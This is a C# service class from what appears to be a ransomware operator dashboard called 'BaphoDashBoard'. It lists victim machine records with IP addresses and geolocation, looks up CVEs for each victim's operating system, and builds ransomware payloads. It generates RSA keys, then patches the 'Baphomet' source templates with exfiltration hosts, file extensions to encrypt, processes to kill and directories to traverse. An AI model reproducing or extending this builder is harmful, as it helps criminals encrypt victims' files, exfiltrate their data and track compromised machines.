using BaphoDashBoard.Models;
using Microsoft.EntityFrameworkCore;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using HtmlAgilityPack;
using ScrapySharp.Extensions;
using ScrapySharp.Network;
using BaphoDashBoard.DTO;
using BaphoDashBoard.ViewModels;
using System.IO;
using System.Collections;

namespace BaphoDashBoard.DAL.Services
{
    public class ManagementService : BaseService
    {
        public ManagementService(MyLocalDatabase context) : base(context)
        {
        }
        static ScrapingBrowser _browser = new ScrapingBrowser();
        public async Task<List<Administrators>> GetAdmin()
        {
            List<Administrators> result = new List<Administrators>();

            result = _context.Administrators.Select(x => new Administrators()
            {
                Id = x.Id,
                Username = x.Username,
                Password = x.Password,
                PasswordHash = x.PasswordHash
            }).ToList();

            return result;
        }

        public async Task<List<VictimDetail>> GetRecordList()
        {
            List<VictimDetail> result = new List<VictimDetail>();
            try
            {
                result = await _context.VictimDetail.ToListAsync();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            return result;
        }

        public async Task<AppResult> Delete(int id)
        {
            AppResult result = new AppResult();
            try
            {
                var record_to_delete = await _context.VictimDetail.Where(x => x.Id == id).FirstOrDefaultAsync();
                if (record_to_delete != null)
                {
                    _context.VictimDetail.Remove(record_to_delete);
                    await _context.SaveChangesAsync();
                    result.success = true;
                    result.message = "record delete";
                }
            }
            catch (Exception ex)
            {
                result.success = false;
                result.message = ex.Message;
            }
            return result;
        }

        public async Task<List<RansomDetailsViewModel>> GetRansomwareDetails()
        {
            List<RansomDetailsViewModel> ransomwaredetails = new List<RansomDetailsViewModel>();
            try
            {
                ransomwaredetails = await _context.Ransomware.Select(x => new RansomDetailsViewModel()
                {
                    Name = x.Name,
                    Description = x.Description,
                    Date = x.ReleaseDate.ToShortDateString()

                }).ToListAsync();
            }
            catch(Exception ex)
            {
                Console.WriteLine(ex.Message);

            }
            return ransomwaredetails;
        }

        public async Task<DetailsViewModel> Details(int id)
        {
            DetailsViewModel victimdetails = new DetailsViewModel();
            try
            {
                victimdetails = await _context.VictimDetail.Where(x => x.Id == id).Select(s => new DetailsViewModel()
                {
                    Id = s.Id,
                    MachineName = s.MachinName,
                    Machine_OS = s.MachineOS,
                    HostName = s.Hostname,
                    Ip = s.Ip,
                    Country = s.Country,
                    City = s.City,
                    PostalCode = s.PostalCode,
                    Latitude = s.Lat,
                    Longitude = s.Lng,
                    Region = s.Region,
                }).FirstOrDefaultAsync();

                var url = "https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=" + victimdetails.Machine_OS.Replace(" ", "+");
                var pagelinks = GetPageLinks(url);

                victimdetails.CveInfo = pagelinks;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }

            return victimdetails;
        }

        static List<NameAndValueDTO> GetPageLinks(string url)
        {
            List<NameAndValueDTO> info = new List<NameAndValueDTO>();
            var cve_info = "";
            var cve_name = "";

            var html = GetHtmlContent(url);
            var links = html.CssSelect("td");
            foreach (var link in links)
            {
                //if (link.Attributes["href"].Value.Contains("cvename"))
                //{
                //    homePageLinks.Add(link.Attributes["href"].OwnerNode.InnerHtml);
                //}

                if (link.Attributes.Contains("valign") && !link.Attributes.Contains("nowrap"))
                {
                    cve_info = link.Attributes["valign"].OwnerNode.InnerHtml;
                }
                if (link.Attributes.Contains("valign") && link.Attributes.Contains("nowrap"))
                {
                    cve_name = link.InnerText;
                }

                if(cve_name != "" && cve_info != "")
                {
                    info.Add(new NameAndValueDTO() { Title = cve_name, Description = cve_info });
                }
            }
            return info;
        }

        static HtmlNode GetHtmlContent(string url)
        {
            WebPage webpage = _browser.NavigateToPage(new Uri(url));
            return webpage.Html;
        }

        public async Task<AppResult> CreateRansomware(GenerateRansomwareDTO model)
        {
            AppResult result = new AppResult();
            try
            {
                model.HostsList.AddRange(model.Hosts.Trim('[', ']').Split(",").Select(x => x.Trim('"')).ToArray());
                model.ExtensionsList.AddRange(model.Extensions.Trim('[', ']').Split(",").Select(x => x.Trim('"')).ToArray());
                model.ProcessesList.AddRange(model.Processes.Trim('[', ']').Split(",").Select(x => x.Trim('"')).ToArray());
                model.DirsList.AddRange(model.Dirs.Trim('[', ']').Split(",").Select(x => x.Trim('"')).ToArray());

                var rsa_keys = GenerateRsaKeys();
                model.PublicKey = rsa_keys.PublicKey;

                var edit_ransomware = await EditBaphometFiles(model);

                if(edit_ransomware.success == true)
                {

                    Ransomware ransomware = new Ransomware()
                    {
                        Name = model.Name,
                        Description = model.Description,
                        ReleaseDate = DateTime.Now,
                        PublicKey = rsa_keys.PublicKey,
                        PrivateKey = rsa_keys.PrivateKey
                    };
                    // _context.Ransomware.Add(ransomware);
                    //  await _context.SaveChangesAsync();

                    result.message = "Your ransomare has been compiled successfully!";
                }

            }
            catch(Exception ex)
            {
                result.success = false;
                result.message = ex.Message;
            }
            return result;
        }

        public async Task<AppResult> EditBaphometFiles(GenerateRansomwareDTO model)
        {
            AppResult result = new AppResult();
            try
            { 
                var getpath = Directory.GetCurrentDirectory();
                var main_path = getpath.Remove(getpath.Length - 15);
                main_path = Path.Combine(main_path, "Tools","Baphomet");

                var draw_rsa_key = DrawParameters(Path.Combine(main_path, "Utilities"), "CryptRSA.cs", "<public key here>", model);
                var draw_host_list = DrawParameters(Path.Combine(main_path, "Utilities"), "NetInfo.cs", "<host list here>", model);
                var draw_extensions = DrawParameters(Path.Combine(main_path, "Utilities"), "Crypt.cs", "<extensions list here>", model);
                var draw_processes = DrawParameters(Path.Combine(main_path, "Utilities"), "Diagnostics.cs", "<processes list here>", model);
                var draw_dirs = DrawParameters(main_path, "Program.cs", "<dirs list here>", model);

                if(draw_rsa_key.Result.success == true)
                {

                }
              
            }
            catch(Exception ex)
            {
                result.success = false;
                result.message = ex.Message;
            }
            return result;
        }

        public async Task<AppResult> DrawParameters(string file_path, string file, string refence_value, GenerateRansomwareDTO model)
        {
            AppResult result = new AppResult();
            try
            {
                var file_location = Path.Combine(file_path, file);
                string[] file_content = File.ReadAllLines(file_location);

                switch (file)
                {
                    //Pego la llave publica que cifra la llave simetrica.
                    case "CryptRSA.cs":

                        for (var i = 0; i < file_content.Length; i++)
                        {
                            if (file_content[i].Contains(refence_value))
                            {
                                file_content[i] = file_content[i].Replace(refence_value, model.PublicKey);
                            }
                        }
                        File.WriteAllLines(file_location, file_content);
                        break;

                    //Pego la lista host a los cuales el ransomware buscara enviar la info.
                    case "NetInfo.cs":

                        var hostlist_string = "";
                        refence_value = '"' + refence_value + '"';

                        foreach(var host in model.HostsList)
                        {
                            hostlist_string = hostlist_string + '"' + host.ToString() + '"' + ',';
                        }
                        hostlist_string = hostlist_string.Remove(hostlist_string.LastIndexOf(","), ",".Length);

                        for (var i = 0; i < file_content.Length; i++)
                        {
                            if (file_content[i].Contains(refence_value))
                            {
                                file_content[i] = file_content[i].Replace(refence_value, hostlist_string);
                            }
                        }
                        File.WriteAllLines(file_location, file_content);
                        break;

                    //Pego las extensiones que deseo cifrar.
                    case "Crypt.cs":
                        var extensions_list_string = "";
                        refence_value = '"' + refence_value + '"';

                        foreach (var extension in model.ExtensionsList)
                        {
                            extensions_list_string = extensions_list_string + '"' + extension.ToString() + '"' + ',';
                        }
                        extensions_list_string = extensions_list_string.Remove(extensions_list_string.LastIndexOf(","), ",".Length);

                        for (var i = 0; i < file_content.Length; i++)
                        {
                            if (file_content[i].Contains(refence_value))
                            {
                                file_content[i] = file_content[i].Replace(refence_value, extensions_list_string);
                            }
                        }
                        File.WriteAllLines(file_location, file_content);

                        break;

                    //Pego los procesos que deseo matar para cifrar archivos abiertos
                    case "Diagnostics.cs":

                        var processes_list_string = "";
                        refence_value = '"' + refence_value + '"';

                        foreach (var process in model.ProcessesList)
                        {
                            processes_list_string = processes_list_string + '"' + process.ToString() + '"' + ',';
                        }
                        processes_list_string = processes_list_string.Remove(processes_list_string.LastIndexOf(","), ",".Length);

                        for (var i = 0; i < file_content.Length; i++)
                        {
                            if (file_content[i].Contains(refence_value))
                            {
                                file_content[i] = file_content[i].Replace(refence_value, processes_list_string);
                            }
                        }
                        File.WriteAllLines(file_location, file_content);

                        break;
                    //Pego los directoros que el ransomware recorrera.
                    case "Program.cs":
                        var dirs_list_string = "";
                        refence_value = '"' + refence_value + '"';

                        foreach (var dir in model.DirsList)
                        {
                            dirs_list_string = dirs_list_string + '"' + dir.ToString() + '"' + ',';
                        }
                        dirs_list_string = dirs_list_string.Remove(dirs_list_string.LastIndexOf(","), ",".Length);

                        for (var i = 0; i < file_content.Length; i++)
                        {
                            if (file_content[i].Contains(refence_value))
                            {
                                file_content[i] = file_content[i].Replace(refence_value, dirs_list_string);
                            }
                        }
                        File.WriteAllLines(file_location, file_content);

                        break;
                }

            }
            catch (Exception ex)
            {
                result.success = false;
                result.message = ex.Message;
            }
            return result;

        }
    }
}
